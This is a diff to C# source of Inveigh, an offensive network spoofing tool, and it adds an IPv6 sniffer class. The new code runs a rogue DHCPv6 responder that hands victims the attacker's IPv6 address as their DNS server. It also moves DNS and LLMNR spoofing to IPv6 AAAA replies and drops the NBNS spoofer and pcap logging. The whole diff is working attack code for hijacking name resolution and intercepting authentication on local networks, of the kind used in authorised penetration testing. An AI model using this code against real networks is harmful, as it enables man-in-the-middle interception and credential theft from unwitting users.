@@ -7,27 +7,45 @@ using System.Collections;
 
 namespace Inveigh
 {
-    class Sniffer
+    class SnifferIPv6
     {
         public static FileStream pcapFile = null;
         static Hashtable tcpSessionTable = Hashtable.Synchronized(new Hashtable());
 
-        public static void SnifferSpoofer(string snifferIP, string spooferIP, string dnsTTL, string llmnrTTL, string mdnsTTL, string nbnsTTL, string[] mdnsTypes, string[] nbnsTypes, string[] pcapTCP, string[] pcapUDP)
+        public static void SnifferSpoofer(string ipV4, string snifferIP, string snifferMAC, string spooferIP, string spooferIPv6, string dnsTTL, string llmnrTTL, string mdnsTTL, string nbnsTTL, string[] mdnsTypes, string[] nbnsTypes, string dhcpv6DomainSuffix, string[] pcapTCP, string[] pcapUDP)
         {
             byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
+            byte[] spooferIPv6Data = IPAddress.Parse(spooferIPv6).GetAddressBytes();
             byte[] byteIn = new byte[4] { 1, 0, 0, 0 };
             byte[] byteOut = new byte[4] { 1, 0, 0, 0 };
             byte[] byteData = new byte[65534];
             Socket snifferSocket;
+            EndPoint snifferEndPointRemote;
+            IPAddress destinationIPAddress = IPAddress.Parse(snifferIP);
+            int packetLength;
+            int dhcpv6IPIndex = 1;
+            byte[] dhcpv6DomainSuffixData = Util.NewDNSNameArray(dhcpv6DomainSuffix);
+            Random ipv6Random = new Random();
+            int ipv6RandomValue = ipv6Random.Next(1, 9999);
+            byte[] snifferMACArray = new byte[6];
+            snifferMAC = snifferMAC.Insert(2, "-").Insert(5, "-").Insert(8, "-").Insert(11, "-").Insert(14, "-");
+            int i = 0;
+
+            foreach (string character in snifferMAC.Split('-'))
+            {
+                snifferMACArray[i] = Convert.ToByte(Convert.ToInt16(character, 16));
+                i++;
+            }
 
             try
             {
-                snifferSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
+                snifferSocket = new Socket(AddressFamily.InterNetworkV6, SocketType.Raw, ProtocolType.Udp);
                 snifferSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
                 snifferSocket.ReceiveBufferSize = 65534;
                 IPEndPoint snifferEndPoint = new IPEndPoint(IPAddress.Parse(snifferIP), 0);
                 snifferSocket.Bind(snifferEndPoint);
                 snifferSocket.IOControl(IOControlCode.ReceiveAll, byteIn, byteOut);
+                snifferEndPointRemote = new IPEndPoint(IPAddress.IPv6Any, 0);
             }
             catch
             {
@@ -39,24 +57,6 @@ namespace Inveigh
 
                 throw;
             }         
-            
-            int packetLength;
-            string outputPcap = "";
-
-            if (Program.enabledPcap)
-            {
-                byte[] pcapHeader = new byte[24] { 0xd4, 0xc3, 0xb2, 0xa1, 0x02, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 };
-                outputPcap = Path.Combine(Program.argFileOutputDirectory, String.Concat(Program.argFilePrefix, "-Packets.pcap"));
-                bool existsPcapFile = File.Exists(outputPcap);
-
-                pcapFile = new FileStream(outputPcap, FileMode.Append, FileAccess.Write);
-
-                if (!existsPcapFile)
-                {
-                    pcapFile.Write(pcapHeader, 0, pcapHeader.Length);
-                }
-
-            }
 
             while (!Program.exitInveigh)
             {
@@ -66,7 +66,7 @@ namespace Inveigh
 
                     try
                     {
-                        packetLength = snifferSocket.Receive(byteData, 0, byteData.Length, SocketFlags.None);
+                        packetLength = snifferSocket.ReceiveFrom(byteData, 0, byteData.Length, SocketFlags.None, ref snifferEndPointRemote);
                     }
                     catch
                     {
@@ -77,20 +77,10 @@ namespace Inveigh
                     {
                         MemoryStream memoryStream = new MemoryStream(byteData, 0, packetLength);
                         BinaryReader binaryReader = new BinaryReader(memoryStream);
-                        byte versionHL = binaryReader.ReadByte();
-                        binaryReader.ReadByte();
-                        uint totalLength = Util.DataToUInt16(binaryReader.ReadBytes(2)); //this is 0 with tcp offload
-                        binaryReader.ReadBytes(5);
-                        byte protocolNumber = binaryReader.ReadByte();
-                        binaryReader.ReadBytes(2);
-                        byte[] sourceIP = binaryReader.ReadBytes(4);
-                        IPAddress sourceIPAddress = new IPAddress(sourceIP);
-                        byte[] destinationIP = binaryReader.ReadBytes(4);
-                        IPAddress destinationIPAddress = new IPAddress(destinationIP);
-                        byte headerLength = versionHL;
-                        headerLength <<= 4;
-                        headerLength >>= 4;
-                        headerLength *= 4;
+                        byte[] sourceIP = { 0x00, 0x00, 0x00, 0x00 };
+                        byte[] destinationIP = { 0x00, 0x00, 0x00, 0x00 };
+                        IPAddress sourceIPAddress = IPAddress.Parse(snifferEndPointRemote.ToString().Substring(0, snifferEndPointRemote.ToString().Length - 2));                      
+                        int protocolNumber = (int)snifferSocket.ProtocolType;
 
                         switch (protocolNumber)
                         {
@@ -230,12 +220,6 @@ namespace Inveigh
                                         break;
                                 }
 
-                                if (Program.enabledPcap && (pcapTCP != null && pcapTCP.Length > 0 && (Array.Exists(pcapTCP, element => element == tcpSourcePort.ToString()) || 
-                                    Array.Exists(pcapTCP, element => element == tcpDestinationPort.ToString()) || Array.Exists(pcapTCP, element => element == "ALL"))))
-                                {
-                                    PcapOutput((uint)packetLength, byteData);
-                                }
-
                                 break;
 
                             case 17:
@@ -257,8 +241,188 @@ namespace Inveigh
 
                                 switch (udpDestinationPort)
                                 {
-                                    case 546:
-                                        Console.WriteLine("blah");
+
+                                    case 547:
+                                        byte[] dhcpv6MessageTypeID = new byte[1];
+                                        Buffer.BlockCopy(udpPayload, 0, dhcpv6MessageTypeID, 0, 1);
+                                        byte[] dhcpv6TransactionID = new byte[3];
+                                        Buffer.BlockCopy(udpPayload, 1, dhcpv6TransactionID, 0, 3);
+                                        byte[] dhcpv6ClientIdentifier = new byte[18];
+                                        Buffer.BlockCopy(udpPayload, 10, dhcpv6ClientIdentifier, 0, 18);
+                                        byte[] dhcpv6ClientMACData = new byte[6];
+                                        Buffer.BlockCopy(udpPayload, 22, dhcpv6ClientMACData, 0, 6);
+                                        string dhcpv6ClientMAC = BitConverter.ToString(dhcpv6ClientMACData).Replace("-", ":");
+                                        byte[] dhcpv6IAID = new byte[4];
+
+                                        if ((int)dhcpv6MessageTypeID[0] == 1)
+                                        {
+                                            Buffer.BlockCopy(udpPayload, 32, dhcpv6IAID, 0, 4);
+                                        }
+                                        else
+                                        {
+                                            Buffer.BlockCopy(udpPayload, 46, dhcpv6IAID, 0, 4);
+                                        }
+                                        
+                                        Array.Reverse(udpSourcePort);
+                                        byte[] dhcpv6IPSniffer = IPAddress.Parse(snifferIP).GetAddressBytes();
+                                        byte[] dhcpv6ClientIP = new byte[16];
+                                        string dhcpv6LeaseIP = "";
+                                        byte[] dhcpv6OptionData = new byte[2];
+                                        byte[] dhcpv6OptionLength = new byte[2];
+                                        string dhcpv6FQDN = "";
+                                        string dhcpv6MessageType = "";
+                                        string dhcpv6ResponseMessage = "";
+                                        string dhcpv6ResponseMessage2 = "";
+
+                                        if ((int)dhcpv6MessageTypeID[0] == 1 || (int)dhcpv6MessageTypeID[0] == 3 || (int)dhcpv6MessageTypeID[0] == 5)
+                                        {
+
+                                            for (i = 12; i < udpPayload.Length; i++)
+                                            {
+
+                                                if (Util.UInt16DataLength(i, udpPayload) == 39)
+                                                {
+                                                    dhcpv6FQDN = Util.ParseNameQuery((i + 4), udpPayload);
+                                                }
+
+                                            }
+
+                                            int index = BitConverter.ToString(udpPayload).Replace("-", String.Empty).IndexOf("4D53465420352E30");
+
+                                            if (index >= 0 && Program.dhcpv6ClientTable.ContainsKey(dhcpv6ClientMAC))
+                                            {
+                                                dhcpv6LeaseIP = Program.dhcpv6ClientTable[dhcpv6ClientMAC].ToString();
+                                                dhcpv6ClientIP = IPAddress.Parse(dhcpv6LeaseIP).GetAddressBytes();
+                                            }
+                                            else if (index >= 0 && !Program.dhcpv6ClientTable.ContainsKey(dhcpv6ClientMAC))
+                                            {
+                                                dhcpv6LeaseIP = "fe80::" + ipv6RandomValue + ":" + dhcpv6IPIndex;
+                                                dhcpv6ClientIP = IPAddress.Parse(dhcpv6LeaseIP).GetAddressBytes();
+                                                Program.dhcpv6ClientTable.Add(dhcpv6ClientMAC, dhcpv6LeaseIP);
+                                                dhcpv6IPIndex++;
+
+                                                lock (Program.dhcpv6FileList)
+                                                {
+                                                    Program.dhcpv6FileList.Add(dhcpv6ClientMAC + "," + dhcpv6LeaseIP);
+                                                }
+
+                                            }
+
+                                            if (Program.enabledDHCPv6)
+                                            {
+
+                                                if (index > 0)
+                                                {
+
+                                                    using (MemoryStream ms = new MemoryStream())
+                                                    {
+                                                        ms.Write((new byte[2] { 0x02, 0x23 }), 0, 2);
+                                                        ms.Write(udpSourcePort, 0, 2);
+                                                        ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
+                                                        ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
+
+                                                        if ((int)dhcpv6MessageTypeID[0] == 1)
+                                                        {
+                                                            ms.Write((new byte[1] { 0x02 }), 0, 1);
+                                                        }
+                                                        else if ((int)dhcpv6MessageTypeID[0] == 3)
+                                                        {
+                                                            ms.Write((new byte[1] { 0x07 }), 0, 1);
+                                                        }
+                                                        else if ((int)dhcpv6MessageTypeID[0] == 5)
+                                                        {
+                                                            ms.Write((new byte[1] { 0x07 }), 0, 1);
+                                                        }
+
+                                                        ms.Write(dhcpv6TransactionID, 0, dhcpv6TransactionID.Length);
+                                                        ms.Write(dhcpv6ClientIdentifier, 0, dhcpv6ClientIdentifier.Length);
+                                                        ms.Write((new byte[4] { 0x00, 0x02, 0x00, 0x0a }), 0, 4);
+                                                        ms.Write((new byte[4] { 0x00, 0x03, 0x00, 0x01 }), 0, 4);
+                                                        ms.Write(snifferMACArray, 0, snifferMACArray.Length);
+                                                        ms.Write((new byte[4] { 0x00, 0x17, 0x00, 0x10 }), 0, 4);
+                                                        ms.Write(spooferIPv6Data, 0, spooferIPv6Data.Length);
+                                                        
+                                                        if (!String.IsNullOrEmpty(dhcpv6DomainSuffix))
+                                                        {
+                                                            ms.Write((new byte[2] { 0x00, 0x18 }), 0, 2);
+                                                            ms.Write(Util.IntToByteArray2(dhcpv6DomainSuffixData.Length), 0, 2);
+                                                            ms.Write(dhcpv6DomainSuffixData, 0, dhcpv6DomainSuffixData.Length);
+                                                        }
+
+                                                        ms.Write((new byte[4] { 0x00, 0x03, 0x00, 0x28 }), 0, 4);
+                                                        ms.Write(dhcpv6IAID, 0, dhcpv6IAID.Length);
+                                                        ms.Write((new byte[12] { 0x00, 0x00, 0x00, 0xc8, 0x00, 0x00, 0x00, 0xfa, 0x00, 0x05, 0x00, 0x18 }), 0, 12);
+                                                        ms.Write(dhcpv6ClientIP, 0, dhcpv6ClientIP.Length);
+                                                        ms.Write((new byte[8] { 0x00, 0x00, 0x01, 0x2c, 0x00, 0x00, 0x01, 0x2c }), 0, 8);
+                                                        ms.Position = 4;
+                                                        ms.Write(Util.IntToByteArray2((int)ms.Length), 0, 2);
+                                                        byte[] pseudoHeader = Util.GetIPv6PseudoHeader(destinationIPAddress, sourceIPAddress, 17, (int)ms.Length);
+                                                        UInt16 checkSum = Util.GetPacketChecksum(pseudoHeader, ms.ToArray());
+                                                        ms.Position = 6;
+                                                        byte[] packetChecksum = Util.IntToByteArray2(checkSum);
+                                                        Array.Reverse(packetChecksum);
+                                                        ms.Write(packetChecksum, 0, 2);
+                                                        Socket dhcpv6SendSocket = new Socket(AddressFamily.InterNetworkV6, SocketType.Raw, ProtocolType.Udp);
+                                                        dhcpv6SendSocket.SendBufferSize = 1024;
+                                                        IPEndPoint dhcpv6EndPoint = new IPEndPoint(sourceIPAddress, 546);
+                                                        dhcpv6SendSocket.SendTo(ms.ToArray(), dhcpv6EndPoint);
+                                                        dhcpv6SendSocket.Close();
+                                                    }
+
+                                                }
+
+                                            }
+
+                                            if (!Program.enabledDHCPv6 && (int)dhcpv6MessageTypeID[0] == 1)
+                                            {
+                                                dhcpv6MessageType = "solicitation";
+                                                dhcpv6ResponseMessage = "spoofer disabled";
+                                            }
+                                            else if (index < 0)
+                                            {
+                                                dhcpv6MessageType = "solicitation";
+                                                dhcpv6ResponseMessage = "vendor ignored";
+                                            }
+                                            else if ((int)dhcpv6MessageTypeID[0] == 1)
+                                            {
+                                                dhcpv6MessageType = "solicitation";
+                                                dhcpv6ResponseMessage = "response sent";
+                                                dhcpv6ResponseMessage2 = "advertised";
+                                            }
+                                            else if ((int)dhcpv6MessageTypeID[0] == 3)
+                                            {
+                                                dhcpv6MessageType = "request";
+                                                dhcpv6ResponseMessage = "response sent";
+                                                dhcpv6ResponseMessage2 = "leased";
+                                            }
+                                            else if ((int)dhcpv6MessageTypeID[0] == 5)
+                                            {
+                                                dhcpv6MessageType = "renew";
+                                                dhcpv6ResponseMessage = "response sent";
+                                                dhcpv6ResponseMessage2 = "renewed";
+                                            }                
+
+                                            lock (Program.outputList)
+                                            {
+
+                                                if (!String.IsNullOrEmpty(dhcpv6FQDN))
+                                                {
+                                                    Program.outputList.Add(String.Format("[+] [{0}] DHCPv6 {1} from {2}({3}) [{4}]", DateTime.Now.ToString("s"), dhcpv6MessageType, sourceIPAddress, dhcpv6FQDN, dhcpv6ResponseMessage));
+                                                }
+                                                else
+                                                {
+                                                    Program.outputList.Add(String.Format("[+] [{0}] DHCPv6 {1} from {2} [{3}]", DateTime.Now.ToString("s"), dhcpv6MessageType, sourceIPAddress, dhcpv6ResponseMessage));
+                                                }
+
+                                                if (String.Equals(dhcpv6ResponseMessage, "response sent"))
+                                                {
+                                                    Program.outputList.Add(String.Format("[+] [{0}] DHCPv6 {1} {2} to {3}", DateTime.Now.ToString("s"), dhcpv6LeaseIP, dhcpv6ResponseMessage2, dhcpv6ClientMAC));
+                                                }
+
+                                            }
+
+                                        }
+
                                         break;
 
                                     case 53:
@@ -286,7 +450,7 @@ namespace Inveigh
                                             {
                                                 ms.Write((new byte[2] { 0x00, 0x35 }), 0, 2);
                                                 ms.Write(udpSourcePort, 0, 2);
-                                                ms.Write(Util.IntToByteArray2(udpResponseLength), 0, 2);
+                                                ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                 ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                 ms.Write(dnsTransactionID, 0, dnsTransactionID.Length);
                                                 ms.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
@@ -297,7 +461,15 @@ namespace Inveigh
                                                 ms.Write(ttlDNS, 0, 4);
                                                 ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                                                 ms.Write(spooferIPData, 0, spooferIPData.Length);
-                                                Socket dnsSendSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
+                                                ms.Position = 4;
+                                                ms.Write(Util.IntToByteArray2((int)ms.Length), 0, 2);
+                                                byte[] dnsPseudoHeader = Util.GetIPv6PseudoHeader(destinationIPAddress, sourceIPAddress, 17, (int)ms.Length);
+                                                UInt16 checkSum = Util.GetPacketChecksum(dnsPseudoHeader, ms.ToArray());
+                                                ms.Position = 6;
+                                                byte[] packetChecksum = Util.IntToByteArray2(checkSum);
+                                                Array.Reverse(packetChecksum);
+                                                ms.Write(packetChecksum, 0, 2);
+                                                Socket dnsSendSocket = new Socket(AddressFamily.InterNetworkV6, SocketType.Raw, ProtocolType.Udp);
                                                 dnsSendSocket.SendBufferSize = 1024;
                                                 IPEndPoint dnsEndPoint = new IPEndPoint(sourceIPAddress, (int)endpointSourcePort);
                                                 dnsSendSocket.SendTo(ms.ToArray(), dnsEndPoint);
@@ -325,80 +497,6 @@ namespace Inveigh
 
                                         }
 
-                                        
-
-                                        break;
-
-                                    case 137:
-                                        byte[] nbnsQuestionsAnswerRRs = new byte[4];
-                                        System.Buffer.BlockCopy(udpPayload, 4, nbnsQuestionsAnswerRRs, 0, 4);
-                                        byte[] nbnsAdditionalRRs = new byte[2];
-                                        System.Buffer.BlockCopy(udpPayload, 10, nbnsAdditionalRRs, 0, 2);
-
-                                        if (BitConverter.ToString(nbnsQuestionsAnswerRRs) == "00-01-00-00" && BitConverter.ToString(nbnsAdditionalRRs) != "00-01")
-                                        {
-                                            string nbnsResponseMessage = "";
-                                            udpLength += 12;
-                                            Array.Reverse(udpSourcePort);
-                                            byte[] ttlNBNS = BitConverter.GetBytes(Int32.Parse(nbnsTTL));
-                                            Array.Reverse(ttlNBNS);
-                                            byte[] nbnsTransactionID = new byte[2];
-                                            System.Buffer.BlockCopy(udpPayload, 0, nbnsTransactionID, 0, 2);
-                                            byte[] nbnsRequestType = new byte[2];
-                                            System.Buffer.BlockCopy(udpPayload, 43, nbnsRequestType, 0, 2);
-                                            string nbnsQueryType = NBNS.NBNSQueryType(nbnsRequestType);
-                                            byte[] nbnsType = new byte[1];
-                                            System.Buffer.BlockCopy(udpPayload, 47, nbnsType, 0, 1);
-                                            byte[] nbnsRequest = new byte[udpPayload.Length - 20];
-                                            System.Buffer.BlockCopy(udpPayload, 13, nbnsRequest, 0, nbnsRequest.Length);
-                                            string nbnsRequestHost = NBNS.BytesToNBNSQuery(nbnsRequest);
-                                            nbnsResponseMessage = Util.CheckRequest(nbnsRequestHost, sourceIPAddress.ToString(), snifferIP.ToString(), "NBNS");
-
-                                            if (Program.enabledNBNS && String.Equals(nbnsResponseMessage, "response sent"))
-                                            {
-
-                                                if (Array.Exists(nbnsTypes, element => element == nbnsQueryType) && !String.Equals(BitConverter.ToString(nbnsType),"21"))
-                                                {
-
-                                                    using (MemoryStream ms = new MemoryStream())
-                                                    {
-                                                        ms.Write((new byte[2] { 0x00, 0x89 }), 0, 2);
-                                                        ms.Write(udpSourcePort, 0, 2);
-                                                        ms.Write(Util.IntToByteArray2((int)udpLength), 0, 2);
-                                                        ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
-                                                        ms.Write(nbnsTransactionID, 0, nbnsTransactionID.Length);
-                                                        ms.Write((new byte[11] { 0x85, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x20 }), 0, 11);
-                                                        ms.Write(nbnsRequest, 0, nbnsRequest.Length);
-                                                        ms.Write(nbnsRequestType, 0, 2);
-                                                        ms.Write((new byte[5] { 0x00, 0x00, 0x20, 0x00, 0x01 }), 0, 5);
-                                                        ms.Write(ttlNBNS, 0, 4);
-                                                        ms.Write((new byte[4] { 0x00, 0x06, 0x00, 0x00 }), 0, 4);
-                                                        ms.Write(spooferIPData, 0, spooferIPData.Length);
-                                                        Socket nbnsSendSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
-                                                        nbnsSendSocket.SendBufferSize = 1024;
-                                                        IPEndPoint nbnsEndPoint = new IPEndPoint(sourceIPAddress, 137);
-                                                        nbnsSendSocket.SendTo(ms.ToArray(), nbnsEndPoint);
-                                                        nbnsSendSocket.Close();
-                                                    }
-
-                                                }
-                                                else if (String.Equals(BitConverter.ToString(nbnsType), "21"))
-                                                {
-                                                    nbnsResponseMessage = "NBSTAT request";
-                                                }
-                                                else
-                                                {
-                                                    nbnsResponseMessage = "NBNS type disabled";
-                                                }
-
-                                            }
-
-                                            lock (Program.outputList)
-                                            {
-                                                Program.outputList.Add(String.Format("[+] [{0}] NBNS request for {1}<{2}> from {3} [{4}]", DateTime.Now.ToString("s"), nbnsRequestHost, nbnsQueryType, sourceIPAddress, nbnsResponseMessage));
-                                            }
-
-                                        }
                                         break;
 
                                     case 5353:
@@ -530,7 +628,7 @@ namespace Inveigh
                                         byte[] llmnrType = new byte[2];
                                         System.Buffer.BlockCopy(udpPayload, (udpPayload.Length - 4), llmnrType, 0, 2);
 
-                                        if (BitConverter.ToString(llmnrType) != "00-1C")
+                                        if (BitConverter.ToString(llmnrType) == "00-1C")
                                         {
                                             udpLength += (byte)(udpPayload.Length - 2);
                                             Array.Reverse(udpSourcePort);
@@ -541,29 +639,37 @@ namespace Inveigh
                                             System.Buffer.BlockCopy(udpPayload, 12, llmnrRequestLength, 0, 1);
                                             System.Buffer.BlockCopy(udpPayload, 13, llmnrRequest, 0, llmnrRequest.Length);
                                             string llmnrRequestHost = Util.ParseNameQuery(12, udpPayload);
-                                            llmnrResponseMessage = Util.CheckRequest(llmnrRequestHost, sourceIPAddress.ToString(), snifferIP.ToString(), "LLMNR");
+                                            llmnrResponseMessage = Util.CheckRequest(llmnrRequestHost, sourceIPAddress.ToString(), snifferIP.ToString(), "LLMNRv6");
 
-                                            if (Program.enabledLLMNR && String.Equals(llmnrResponseMessage, "response sent"))
+                                            if (Program.enabledLLMNRv6 && String.Equals(llmnrResponseMessage, "response sent"))
                                             {
 
                                                 using (MemoryStream ms = new MemoryStream())
                                                 {
                                                     ms.Write((new byte[2] { 0x14, 0xeb }), 0, 2);
                                                     ms.Write(udpSourcePort, 0, 2);
-                                                    ms.Write(Util.IntToByteArray2((int)udpLength), 0, 2);
+                                                    ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                     ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                     ms.Write(llmnrTransactionID, 0, llmnrTransactionID.Length);
                                                     ms.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                                                     ms.Write(llmnrRequestLength, 0, 1);
                                                     ms.Write(llmnrRequest, 0, llmnrRequest.Length);
-                                                    ms.Write((new byte[5] { 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 5);
+                                                    ms.Write((new byte[5] { 0x00, 0x00, 0x1c, 0x00, 0x01 }), 0, 5);
                                                     ms.Write(llmnrRequestLength, 0, 1);
                                                     ms.Write(llmnrRequest, 0, llmnrRequest.Length);
-                                                    ms.Write((new byte[5] { 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 5);
+                                                    ms.Write((new byte[5] { 0x00, 0x00, 0x1c, 0x00, 0x01 }), 0, 5);
                                                     ms.Write(ttlLLMNR, 0, 4);
-                                                    ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
-                                                    ms.Write(spooferIPData, 0, spooferIPData.Length);
-                                                    Socket llmnrSendSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
+                                                    ms.Write((new byte[2] { 0x00, 0x10 }), 0, 2);
+                                                    ms.Write(spooferIPv6Data, 0, spooferIPv6Data.Length);
+                                                    ms.Position = 4;
+                                                    ms.Write(Util.IntToByteArray2((int)ms.Length), 0, 2);
+                                                    byte[] llmnrPseudoHeader = Util.GetIPv6PseudoHeader(destinationIPAddress, sourceIPAddress, 17, (int)ms.Length);
+                                                    Socket llmnrSendSocket = new Socket(AddressFamily.InterNetworkV6, SocketType.Raw, ProtocolType.Udp);
+                                                    UInt16 checkSum = Util.GetPacketChecksum(llmnrPseudoHeader, ms.ToArray());
+                                                    ms.Position = 6;
+                                                    byte[] packetChecksum = Util.IntToByteArray2(checkSum);
+                                                    Array.Reverse(packetChecksum);
+                                                    ms.Write(packetChecksum, 0, 2);
                                                     llmnrSendSocket.SendBufferSize = 1024;
                                                     IPEndPoint llmnrEndPoint = new IPEndPoint(sourceIPAddress, (int)endpointSourcePort);
                                                     llmnrSendSocket.SendTo(ms.ToArray(), llmnrEndPoint);
@@ -583,14 +689,7 @@ namespace Inveigh
 
                                 }
 
-                                if (Program.enabledPcap && (pcapUDP != null && pcapUDP.Length > 0 && (Array.Exists(pcapUDP, element => element == udpSourcePort.ToString()) ||
-                                   Array.Exists(pcapUDP, element => element == udpDestinationPort.ToString()) || Array.Exists(pcapUDP, element => element == "ALL"))))
-                                {
-                                    PcapOutput((uint)packetLength, byteData);
-                                }
-
-                                break;
-             
+                                break;         
                         }
 
                     }
@@ -700,7 +799,7 @@ namespace Inveigh
 
                 lock (Program.outputList)
                 {
-                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) Kerberos authentication preferred from {2}", DateTime.Now.ToString("s"), smbPort, session));
+                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) authentication method is Kerberos from {2}", DateTime.Now.ToString("s"), smbPort, session));
                 }
 
             }
@@ -709,7 +808,7 @@ namespace Inveigh
 
                 lock (Program.outputList)
                 {
-                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) Kerberos authentication preferred to {2}", DateTime.Now.ToString("s"), sourcePort, sessionOutgoing));
+                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) outgoing authentication method is Kerberos to {2}", DateTime.Now.ToString("s"), sourcePort, sessionOutgoing));
                 }
 
             }
